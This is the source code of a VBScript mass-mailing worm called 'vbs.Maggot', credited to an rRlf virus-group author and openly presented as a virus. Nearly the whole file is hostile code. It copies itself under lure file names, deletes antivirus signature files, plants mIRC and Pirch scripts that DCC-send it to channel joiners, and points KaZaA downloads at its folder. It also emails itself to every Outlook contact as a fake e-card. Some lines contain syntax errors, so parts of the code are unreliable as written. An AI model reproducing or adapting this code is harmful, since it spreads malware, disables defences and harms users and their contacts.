' Virus Name : vbs.Maggot
'    Version : B
'     Author : Adious [rRlf]
'    Done On : 30\12\02 
'

On error resume next 
Dim fso, irca, ircb, boot, parent
set fso = CreateObject("Scripting.FileSystemObject")
set parent = Winscript.ScriptFullName
set shell=CreateObject("WScript.Shell")

'implant in system
fso.CopyFile parent, "c:\maggotb.vbs"
fso.CopyFile parent, "c:\windows\system\maggotb.vbs"
fso.CopyFile parent, "c:\windows\Win32file.EXE.vbs"
fso.CopyFile parent, "c:\windows\system\ecard-for-you.EXE.vbs"
fso.CopyFile parent, "c:\command.EXE.vbs"
fso.CreateFolder("c:\windows\dos45")
fso.CopyFile parent, "c:\windows\dos45\HarryPotter2.AVI.vbs"
fso.CopyFile parent, "c:\windows\dos45\Funny_pics.JPEG.vbs"
fso.CopyFile parent, "c:\windows\dos45\South_Park.AVI.vbs"
fso.CopyFile parent, "c:\windows\dos45\WinNuke_patch.EXE.vbs"
fso.CopyFile parent, "c:\windows\dos45\Browser_Accelarator.EXE.vbs"
fso.CopyFile parent, "c:\windows\dos45\Pokemon_Games.EXE.vbs"
fso.CopyFile parent, "c:\windows\dos45\The_Sims_patch.EXE.vbs"
fso.CopyFile parent, "c:\windows\dos45\Age_of_Empires_patch.EXE.vbs"
fso.CopyFile parent, "c:\windows\dos45\Erotic_vid_95.AVI.vbs"
fso.CopyFile parent, "c:\windows\dos45\Erotic_vid_96.AVI.vbs"
fso.CopyFile parent, "c:\windows\dos45\Erotica_vid_uncovered.AVI.vbs"
fso.CopyFile parent, "c:\windows\dos45\Hacking_progs.EXE.vbs"
fso.CopyFile parent, "c:\windows\dos45\Web_defacement.EXE.vbs"
fso.CopyFile parent, "c:\windows\dos45\WinNuker_v2.EXE.vbs"

'Retro tech
If (fso.FileExists(c:\programme\norton~1\s32integ.dll)) Then
  fso.DeleteFile(c:\programme\norton~1\s32integ.dll)
Else 
 End If
If (fso.FileExists (c:\programme\f-prot95\fpwm32.dll)) Then
  fso.DeleteFile(c:\programme\f-prot95\fpwm32.dll)
Else
 End If
If (fso.FileExists(c:\programme\mcafee\scan.dat)) Then
  fso.DeleteFile(c:\programme\mcafee\scan.dat)
Else
 End If
If (fso.FileExists(c:\tbavw95\tbscan.sig)) Then
  fso.DeleteFile(c:\tbavw95\tbscan.sig)
Else
 End If
If (fso.FileExists(c:\tbav\tbav.dat)) Then
  fso.DeleteFlie(c:\tbav\tbav.dat)
Else
 End If
If (fso.FileExists(c:\programme\tbav\tbav.dat)) Then 
  fso.DeleteFile(c:\programme\tbav\tbav.dat)  
Else
 End If
If (fso.fileExists(c:\programme\avpersonal\antivir.vdf)) Then
  fso.DeleteFile(c:\programme\avpersonal\antivir.vdf)
Else
 End If 

'mIrc Worm
set irca = fso.CreateTextFile("c:\m.txt", True)
 irca.Writeline "[script]"
 irca.Writeline "n0=on 1:JOIN:#:{"  
 irca.Writeline "n1= /if ( nick == $me ) { halt }" 
 irca.Writeline "n2= /.dcc send $nick c:\windows\system\maggotb.vbs " 
 irca.Writeline "n3=}"
irca.Close

If (fso.FolderExist(c:\mirc)) Then
 fso.CopyFile "c:\m.txt", "c:\mirc\script.ini"
Else
 EndIf
If (fso.FolderExist(c:\mirc32)) Then
 fso.CopyFile "c:\m.txt", "c:\mirc32\script.ini"
Else
 EndIf
If (fso.FolderExist(c:\Program Files\mirc)) Then
 fso.CopyFile "c:\m.txt", "c:\Program Files\mirc\script.ini"
Else
 EndIf
If (fso.FolderExist(c:\Program Files\mirc32)) Then
 fso.CopyFile "c:\m.txt", "c:\Program Files\mirc32\script.ini"
Else
 EndIf
fso.DeleteFile (c:\m.txt)

set ircb = fso.CreateTextFile("c:\pirch98\events.ini", True)
 ircb.Writeline "[Levels]"
 ircb.Writeline "Enabled=1"
 ircb.Writeline "Count=6"
 ircb.Writeline "Level1=000-Unknowns"
 ircb.Writeline "000-UnknownsEnabled=1"
 ircb.Writeline "Level2=100-Level 100"
 ircb.Writeline "100-Level 100Enabled=1"
 ircb.Writeline "Level3=200-Level 200"
 ircb.Writeline "200-Level 200Enabled=1"
 ircb.Writeline "Level4=300-Level 300"
 ircb.Writeline "300-Level 300Enabled=1"
 ircb.Writeline "Level5=400-Level 400"
 ircb.Writeline "400-Level 400Enabled=1"
 ircb.Writeline "Level6=500-Level 500"
 ircb.Writeline "500-Level 500Enabled=1"
 ircb.Writeline ""
 ircb.Writeline "[000-Unknowns]"
 ircb.Writeline "User1=*!*@*"
 ircb.Writeline "UserCount=1"
 ircb.Writeline "Event1=ON JOIN:#:/dcc send $nick c:\windows\system\maggotb.vbs "
 ircb.Writeline "EventCount=1"
 ircb.Writeline ""
 ircb.Writeline "[100-Level 100]"
 ircb.Writeline "UserCount=0"
 ircb.Writeline "EventCount=0"
 ircb.Writeline ""
 ircb.Writeline "[200-Level 200]"
 ircb.Writeline "UserCount=0"
 ircb.Writeline "EventCount=0"
 ircb.Writeline ""
 ircb.Writeline "[300-Level 300]"
 ircb.Writeline "UserCount=0"
 ircb.Writeline "EventCount=0"
 ircb.Writeline ""
 ircb.Writeline "[400-Level 400]"
 ircb.Writeline "UserCount=0"
 ircb.Writeline "EventCount=0"
 ircb.Writeline ""
 ircb.Writeline "[500-Level 500]"
 ircb.Writeline "UserCount=0"
 ircb.Writeline "EventCount=0"

shell.RegWrite ("HKLM\\Software\\KaZaA\\Transfer\\DlDir0", "C:\windows\dos45")

Dim x
 Set so=CreateObject(fso) 
 Set ol=CreateObject("Outlook.Application") 
 Set out= WScript.CreateObject("Outlook.Application") 
 Set mapi = out.GetNameSpace("MAPI") 
 Set a = mapi.AddressLists(1) 
 For x=1 To a.AddressEntries.Count 
 Set Mail=ol.CreateItem(0) 
 Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
 Mail.Subject="hi!!" 
 Mail.Body="Plz use run this e-card for a massage waiting for you :)" 
 Mail.Attachments.Add ("c:\windows\system\ecard-for-you.EXE.vbs")
 Mail.Send 
 Next 
 ol.Quit 

  